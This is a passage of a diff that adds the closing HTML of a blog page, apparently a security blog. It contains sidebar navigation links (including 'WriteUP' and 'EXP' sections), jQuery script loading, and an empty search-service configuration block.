+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
